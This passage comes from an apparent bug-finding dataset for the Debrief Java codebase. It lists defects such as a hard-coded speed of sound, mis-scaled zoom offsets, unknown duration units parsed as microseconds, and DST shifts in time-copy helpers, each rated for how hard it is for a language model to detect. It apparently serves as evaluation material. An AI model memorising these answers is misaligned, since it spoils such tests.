llm_value: Requires knowing the instance is installed as a static singleton by WorldLocation and CorePlugin; local inspection of the method looks like a harmless optimisation.

title: calcDopplerComponent hard-codes 2951 kts speed of sound, ignores preference
description: calcDopplerComponent uses a local constant speedOfSoundKts = 2951 rather than the value the application configures via SPEED_OF_SOUND_KTS_PROPERTY/SpeedOfSoundKts, whereas the related getPredictedFreq/calcPredictedFreqSI take the speed of sound as a parameter. Debrief.Wrappers.Track.Doublet calls calcDopplerComponent when computing ownship Doppler corrections for frequency residual analysis, so a user-set speed of sound (e.g. 2900 kts for warm water) is silently not applied to that component. Also uses (bearing - course) without wrap, which is harmless under cos but inconsistent with travellingTowards, a private helper referenced only by the inline test.
trigger_input: Set SpeedOfSound preference to 2900 kts and view frequency residuals: the ownship Doppler correction still uses 2951 kts (about 1.8% error in the correction term).
suggested_fix: Add a speedOfSoundKts parameter (or read the shared property) to calcDopplerComponent and pass it from Doublet.
llm_value: Requires noticing the constant duplicates a configurable property and following the Doublet call path.

title: zoom(value, area) shifts the data area with dimensionally wrong deltas
description: After scaling, the method computes deltaX = actualCenter.lat - desiredCenter.lat and deltaY = long difference (names swapped) and then adds deltaX * _scaleVal to latitudes and deltaY * _scaleVal to longitudes, multiplying a degree offset by a degrees-per-pixel scale. The intended recentring on 'area' therefore moves the view by an arbitrary amount (tiny at normal scales), and the comment at L447 admits the inline test does not pass. This is the production path for the plot Zoom tool when dragging bottom-right to top-left (plotViewer ZoomIn -> ZoomOutAreaAction -> projection.zoom(scale, area)).
trigger_input: In the plot editor select the zoom tool and drag a rectangle from bottom-right to top-left: the view zooms out but is not centred on the selected area.
suggested_fix: Compute the new area directly: centre on area.getCentre() with width/height equal to the old area's times value (or reuse setCentre on the recomputed area), and enable the inline test.
llm_value: Needs unit reasoning (degrees times degrees/pixel) and tracing the RCP caller to see that the TODO-marked code is live.

title: fromString maps unknown units to MICROSECONDS; NoSuchElementException
description: fromString tokenises value and units and calls getUnitIndexFor, which returns 0 (MICROSECONDS) for any unrecognised label; verified Duration.fromString("12 mins") yields 0 ms. A string with no units token throws NoSuchElementException rather than the declared ParseException. Used by StepperHandler (trail length, step sizes) and MWCXMLReader.readThisDuration when loading .dpf files.
trigger_input: .dpf Stepper attribute TrailLength="5 mins" (or "5 min"): loaded as 5 microseconds, effectively zero trail; "5" alone crashes the loader with NoSuchElementException.
suggested_fix: Validate the token count and reject unknown unit labels with ParseException; accept common aliases.
llm_value: The dangerous default (index 0 = smallest unit) is only apparent by reading the labels array ordering together with the loader callers.

title: copyOnlyTime/copyOnlyDate use the default local time zone, shifting across DST
description: Both helpers build Calendar.getInstance() (JVM default zone) and copy HOUR_OF_DAY etc., while every other Debrief formatter is fixed to GMT (GMTDateFormat). When source and target fall on different DST offsets the copied time shifts by the DST delta. Verified by compiling with -Duser.timezone=Europe/London: copyOnlyTime(2020-07-01T12:00Z, 2020-01-15T00:00Z) returns 200115 130000 instead of 120000. Callers are the Pepys import time-filter controls.
trigger_input: Pepys import dialog: user keeps the time-of-day from a summer date and changes the date to winter (or vice versa) on a machine in a DST zone; the filter boundary moves by one hour.
suggested_fix: Use Calendar.getInstance(TimeZone.getTimeZone("GMT")) (or java.time with ZoneOffset.UTC) in both helpers.
llm_value: grep-able
related: org.mwc.debrief.pepys PepysImportController L166 L190 L215 L239

title: BaseTimePeriod NPE on INVALID_DATE (null) in overlaps/hashCode/contains
